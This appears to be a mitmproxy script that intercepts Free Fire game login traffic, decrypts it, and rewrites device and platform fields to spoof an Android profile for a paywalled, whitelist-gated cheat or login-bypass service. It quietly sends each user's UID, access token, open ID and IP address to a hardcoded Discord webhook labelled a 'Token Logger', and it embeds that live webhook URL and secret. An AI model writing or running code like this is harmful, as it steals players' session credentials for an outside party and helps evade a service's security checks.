from mitmproxy import http
import json
import asyncio
import aiohttp
import copy
import os
import time
from crypto.encryption_utils import aes_decrypt, encrypt_api
from protocols.protobuf_utils import get_available_room, CrEaTe_ProTo

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1443536928174510171/mbFPRlLOtrNLjG_hrb72mULYKBc6QmyNEiTi4inBDAU4NldsnBvGBKgRYQReHPiur3NR"

MOBILE_PROTO = "6326c9c1859ce2b339f77897132701cf550c24c535eb0c6304eabd1ec0c3b8f48b21909d48d30fc1ddf1b1bd3864fee24b4b36b13585439eb880865c32821aca23a2a8b128b251d8215ae9dba719125708bd480439c49e639d946bc7c50a226f68574ac1b9af2edc357d3f0b5dcf0fa63f5b12f59f18424b6037b36de1200a964eccf5e9569f1b3fa8e832f9b3e65008cafa0a1e4d7f30bb458fa2ce7f60d7823e66468652bf1e789d70fbeb4fe244493faf9b1794779e9104d5542708c3e35d2d99d8a12c2c2732c4002fd464a073ed841528d0f5afde0dab83daf69338d43796633bb0dc075bfb76398878cf561d06b898f8190144bc45c9928706abcfd9c3b6cdabc11429f1c44f985fb7be438f60ca4b59e846a890d8de003789fdc581297b1618ae9d4980bc474032af82fcab135830fbe931a0484d20a308305709790c59e4228801ef730d4c96e517dce0c1ef9036516f9e5642d46c2fe92257af2f1941925983378bd6dd7e2321c466fe72638906b8d7e81e673869e8a945db35b02c2270b26882bd85a5e4c6b882847379a8ef9e7483f284b74dbb337d09c6778b24232d48b3ccb6a5966502c9de5907321fd423dde35436f24b0bace6f82c0f0756cec59cd954255eca6e08023696e639e4347292f785e88e2cb92b20591caccd251da7839dc8340dcf933a5309151e2a0f001652e64fa4cada9ea1feaa31082d5f4bfda58fc5d31dd0864b7c9f5e473cba4d885d3fd90f08c0e06310b864e6cbfcf4a660308785f0ab1418995f6e5391cfa93f3e312afe7e561bfeaad0c7daa3083077027d451a19722832cee0d9ab8303ccc047ce693a1f598b65a0ce0a0cff2414274cb1b787218a1499abe4859a07c5ab303ca3ef687ba072016b438778b351a753c6369e82fb8cd8a82389ba2d96c40b940d3ba511e1b8c8ebad8e19b16d0ef321b9123ea0e140a0e772beeb5cf788d67573bfa0f601082f365c6cc14bb7c28ed92b1138436ac13835d132f03aaa7cb9869e10157251c631b5aa0fa54e49f781fcc28ee0e738c092c68f8f61fd9cfbf17c508a55eaacc73ee502ce0bbdccba22becf34a862e47e943c055f8fd9d46463c13d06a000daf73d94143e9599fee50ee44b4d0efb9c537b13267a05a8e1c0"


decrypted_bytes = aes_decrypt(MOBILE_PROTO)
decrypted_hex = decrypted_bytes.hex()
proto_json = get_available_room(decrypted_hex)
proto_fields = json.loads(proto_json)
proto_template = copy.deepcopy(proto_fields)

ANDROID_FIELD_IDS = [
    "5",   # platform type
    "9",   # device category
    "15",  # CPU features
    "17",  # GPU model
    "24",  # device classification
    "25",  # device model
    "57",  # device hash
    "73",  # abi flag
    "74",  # library path
    "77",  # apk signature
    "78",
    "79",
    "81",
    "83",
    "86",
    "87",
    "88",
    "93",  # channel
]
ANDROID_PROFILE_FIELDS = {
    field_id: copy.deepcopy(proto_template[field_id])
    for field_id in ANDROID_FIELD_IDS
    if field_id in proto_template
}
FORCE_IND_DEVICE_PROFILE = os.getenv("FORCE_IND_DEVICE_PROFILE", "1").lower() not in ("0", "false", "no")

# Universal deviceData and reserved20 values (works for all non-IND servers)
UNIVERSAL_DEVICE_DATA = "KqsHTxnXXUCG8sxXFVB2j0AUs3+0cvY/WgLeTdfTE/KPENeJPpny2EPnJDs8C8cBVMcd1ApAoCmM9MhzDDXabISdK31SKSFSr06eVCZ4D2Yj/C7G"
UNIVERSAL_RESERVED20 = bytes([0x13, 0x52, 0x46, 0x43, 0x07, 0x0E, 0x5C, 0x51, 0x31])

# IND server hosts (keep original behavior, no deviceData/reserved20 override)
IND_LOGIN_HOSTS = {
    "login.ind.freefiremobile.com",
    "ind.freefiremobile.com",
}

# Non-IND server hosts that need deviceData/reserved20 override
NON_IND_LOGIN_HOSTS = {
    # BD server
    "loginbp.ggwhitehawk.com",
    # Other blueshark-based servers
    "loginbp.ggblueshark.com",
    # bluefox-based servers (ME, TH)
    "loginbp.common.ggbluefox.com",
    "loginbp.ggbluefox.com",
    # US-based servers (NA, SAC, BR)
    "login.us.freefiremobile.com",
    "login.freefiremobile.com",
    # Fallback patterns
    "loginbp.",
    ".ggpolarbear.com",
    ".ggbluefox.com",
    ".ggwhitehawk.com",
}


WHITELIST_DIR = os.path.join(os.path.dirname(__file__), "whitelists")
SUPPORTED_REGIONS = ["bd", "ind", "id", "br", "me", "vn", "th", "cis", "pk", "sg", "na", "sac", "eu", "tw"]

def load_whitelist(region):
    try:
        path = os.path.join(WHITELIST_DIR, f"whitelist_{region.lower()}.json")
        with open(path, "r") as f:
            return json.load(f)
    except Exception:
        return {}

def is_uid_whitelisted(uid_str):
    try:
        now = int(time.time())
        print(f"[Whitelist check] UID={uid_str}  Now={now}")

        for region in SUPPORTED_REGIONS:
            whitelist = load_whitelist(region)
            if str(uid_str) in whitelist:
                data = whitelist[str(uid_str)]
                if isinstance(data, dict):
                    expiry = data.get("expiry", 0)
                    stored_region = data.get("region", region.upper())
                    print(f"UID found in {region.upper()} whitelist (region: {stored_region}, expires {expiry}, left {expiry - now}s)")
                    return expiry > now
                else:
                    expiry = int(data)
                    print(f"UID found in {region.upper()} whitelist (expires {expiry}, left {expiry - now}s)")
                    return expiry > now

        print("UID not found in any whitelist")
        return False
    except Exception as e:
        print(f"Error checking whitelist: {e}")
        return False


async def send_discord_embed_async(uid, access_token, open_id, main_active_platform, client_ip=None):
    embed = {
        "title": "🎫 FFMConnect Login Detected",
        "color": 0x2ECC71,
        "fields": [
            {"name": "UID", "value": str(uid), "inline": False},
            {"name": "Access Token", "value": f"`{access_token}`", "inline": False},
            {"name": "Open ID", "value": f"`{open_id}`", "inline": False},
            {"name": "Main Active Platform", "value": str(main_active_platform), "inline": False}
        ],
        "footer": {
            "text": "FFMConnect Token Logger"
        }
    }
    
    if client_ip:
        embed["fields"].append({"name": "Client IP", "value": client_ip, "inline": False})
    
    data = {
        "embeds": [embed]
    }

    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(DISCORD_WEBHOOK_URL, json=data) as resp:
                await resp.text()
    except Exception as e:
        print(f"Error sending to Discord: {e}")

def run_async_task(coro):
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            asyncio.ensure_future(coro)
        else:
            loop.run_until_complete(coro)
    except RuntimeError:
        new_loop = asyncio.new_event_loop()
        asyncio.set_event_loop(new_loop)
        new_loop.run_until_complete(coro)

def get_client_ip(flow: http.HTTPFlow) -> str:
    """Get client IP address"""
    if hasattr(flow.client_conn, 'address') and flow.client_conn.address:
        return flow.client_conn.address[0]
    return "unknown"

def request(flow: http.HTTPFlow) -> None:
    if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
        try:
            request_bytes = flow.request.content
            request_hex = request_bytes.hex()
            decrypted_bytes = aes_decrypt(request_hex)
            decrypted_hex = decrypted_bytes.hex()
            proto_json = get_available_room(decrypted_hex)
            proto_fields = json.loads(proto_json)
            
            print("Original MajorLogin Request Details:")
            print(json.dumps(proto_fields, indent=2, ensure_ascii=False))
            
            uid = None
            access_token = None
            open_id = None
            main_active_platform = None
            
            for field_num in ["1", "2", "3"]:
                if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                    potential_uid = str(proto_fields[field_num]["data"])
                    if potential_uid.isdigit() and len(potential_uid) > 5:
                        uid = potential_uid
                        print(f"Found UID in field {field_num}: {uid}")
                        break
            
            if "29" in proto_fields and isinstance(proto_fields["29"], dict) and "data" in proto_fields["29"]:
                access_token = str(proto_fields["29"]["data"])
            
            if "22" in proto_fields and isinstance(proto_fields["22"], dict) and "data" in proto_fields["22"]:
                open_id = str(proto_fields["22"]["data"])
            
            if "99" in proto_fields and isinstance(proto_fields["99"], dict) and "data" in proto_fields["99"]:
                main_active_platform = str(proto_fields["99"]["data"])
            elif "100" in proto_fields and isinstance(proto_fields["100"], dict) and "data" in proto_fields["100"]:
                main_active_platform = str(proto_fields["100"]["data"])
            
            print(f"Extracted from MajorLogin:")
            print(f"  UID: {uid}")
            print(f"  Access Token: {access_token}")
            print(f"  Open ID: {open_id}")
            print(f"  Main Active Platform: {main_active_platform}")
            
            if access_token and open_id:
                client_ip = get_client_ip(flow)
                print(f"Sending to Discord: UID={uid}, Token={access_token[:20]}..., OpenID={open_id}")
                run_async_task(send_discord_embed_async(uid, access_token, open_id, main_active_platform, client_ip))
            
            print("\n=== MODIFYING MAJORLOGIN REQUEST ===")
            
            base_proto_source = proto_fields if proto_fields else proto_template
            modified_proto = copy.deepcopy(base_proto_source)

            def normalize_value(value, target_type):
                if target_type == "varint":
                    return int(value)
                if target_type == "bytes":
                    if isinstance(value, (bytes, bytearray)):
                        return bytes(value)
                    return str(value).encode("latin-1", "ignore")
                if isinstance(value, bytes):
                    return value.decode("latin-1", "ignore")
                return str(value)

            def set_field(field_number, value, wire_type=None, default_type="string"):
                if value is None:
                    return
                entry = modified_proto.get(field_number)
                if isinstance(entry, dict):
                    target_type = wire_type or entry.get("wire_type", default_type)
                else:
                    target_type = wire_type or default_type
                    entry = {"wire_type": target_type}
                    modified_proto[field_number] = entry
                entry["wire_type"] = target_type
                entry["data"] = normalize_value(value, target_type)

            def preview_value(value, max_chars=20):
                if value is None:
                    return "None"
                if isinstance(value, (bytes, bytearray)):
                    return value.hex()[: max_chars * 2]
                return str(value)[:max_chars]

            set_field("29", access_token, default_type="string")
            if access_token:
                print(f"Updated field 29 (access_token): {preview_value(access_token)}...")

            set_field("22", open_id, default_type="string")
            if open_id:
                print(f"Updated field 22 (open_id): {preview_value(open_id)}")

            request_host = (flow.request.host or "").lower()
            
            # Check if it's an IND server
            is_ind_host = any(ind_host in request_host for ind_host in IND_LOGIN_HOSTS)
            
            # Check if it's a non-IND server that needs deviceData/reserved20 override
            is_non_ind_host = any(non_ind_host in request_host for non_ind_host in NON_IND_LOGIN_HOSTS)
            
            if is_non_ind_host:
                print(f"Detected non-IND login host ({request_host}) – applying deviceData and reserved20 overrides")
                set_field("94", UNIVERSAL_DEVICE_DATA, wire_type="string")
                set_field("102", UNIVERSAL_RESERVED20, wire_type="bytes")
                print("Applied deviceData and reserved20 overrides (keeping original platform values)")
            elif not is_ind_host:
                # For IND and unknown servers, update platform fields if we have the value
                if main_active_platform is not None:
                    set_field("99", main_active_platform, wire_type="varint")
                    set_field("100", main_active_platform, wire_type="varint")
                    print(f"Updated fields 99/100 (main_active_platform): {main_active_platform}")

            if is_ind_host and FORCE_IND_DEVICE_PROFILE and ANDROID_PROFILE_FIELDS:
                for field_id, field_value in ANDROID_PROFILE_FIELDS.items():
                    modified_proto[field_id] = copy.deepcopy(field_value)
                print(f"Applied IND device profile overrides to fields: {list(ANDROID_PROFILE_FIELDS.keys())}")

            print("Modified Request Fields:")
            for field_id in ("29", "22", "94", "99", "100", "102"):
                data = modified_proto.get(field_id, {}).get("data", "NOT_FOUND")
                print(f"  Field {field_id}: {preview_value(data)}")
            
            proto_bytes = CrEaTe_ProTo(modified_proto)
            hex_data = encrypt_api(proto_bytes)
            flow.request.content = bytes.fromhex(hex_data)
            print("Successfully modified and encrypted MajorLogin request")
                
        except Exception as e:
            print(f"Error processing MajorLogin request: {e}")

def response(flow: http.HTTPFlow) -> None:
    if flow.request.method.upper() == "POST" and "/MajorLogin" in flow.request.path:
        try:
            resp_bytes = flow.response.content
            resp_hex = resp_bytes.hex()
            proto_json = get_available_room(resp_hex)
            proto_fields = json.loads(proto_json)
            
            uid_from_response = None
            for field_num in ["1", "2", "3"]:
                if field_num in proto_fields and isinstance(proto_fields[field_num], dict) and "data" in proto_fields[field_num]:
                    potential_uid = str(proto_fields[field_num]["data"])
                    if potential_uid.isdigit() and len(potential_uid) > 5:
                        uid_from_response = potential_uid
                        print(f"Found UID in response field {field_num}: {uid_from_response}")
                        break
            status_color = "[FF0000]"
            uid_color = "[FF0000]"
            if uid_from_response is not None:
                if not is_uid_whitelisted(uid_from_response):
                    flow.response.content = (
                        f"\n"
                        f"[FF0000]⚠ ACCESS DENIED ⚠\n"
                        f"\n"
                        f"[FFFFFF]Your UID [FF0000]{uid_from_response}[FFFFFF] is not authorized.\n"
                        f"[FFFFFF]Account is not listed in secure whitelist or expired.\n"
                        f"\n"
                        f"[FFAA00]Contact [00FF00]Vivek[FFAA00] For Access\n"
                        f"\n"
                    ).encode()
   
                    flow.response.status_code = 500
                    return
                else:
                    print(f"UID {uid_from_response} is authorized")
            else:
                print("No UID found in MajorLogin response")

        except Exception as e:
            print(f"Error processing MajorLogin response: {e}")
